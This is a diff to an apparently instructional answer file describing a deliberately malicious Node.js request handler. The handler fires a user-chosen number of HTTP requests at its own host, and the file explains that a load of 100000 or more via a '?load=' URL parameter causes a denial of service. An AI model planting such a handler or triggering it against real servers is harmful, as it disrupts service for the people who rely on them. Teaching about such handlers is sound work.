@@ -30,8 +30,8 @@ A3.
     Second 'bad' handler:
            badFunc2(request, response){
 
-              response.status(200).send('DOS underway');
-              var load = request.param('load', 10);
+              response.status(200).send('HackInProgress');
+              var load = request.query['load'];
               var att = request.host.split(':');
               var op = {
                     host: att[0],
@@ -44,7 +44,6 @@ A3.
               for (var i = 0 ; i < load ; i++) {
                  require('http').get(op,function(){});
               }
-
            })
 
            This handler is Very evil, each call open as many new get request as specified in the parameter, this goes
@@ -52,6 +51,5 @@ A3.
            server will not be able to provide any service no longer.
 
            In order to launch this evil doer, all you need to do is open the following url:
-           <site url>:<server port>/hello/hacker/<load level>/<any name>.html
-           if no load level is specified, ie <site url>:<server port>/hello/hacker/<any name>.html, the load
-           will default to 10 (which usually will not cause a DOS).
+           <site url>:<server port>/hello/hacker/<any name>.html?load=<any number>
+           In order to Dos attack the server the load number should be at least 100000.
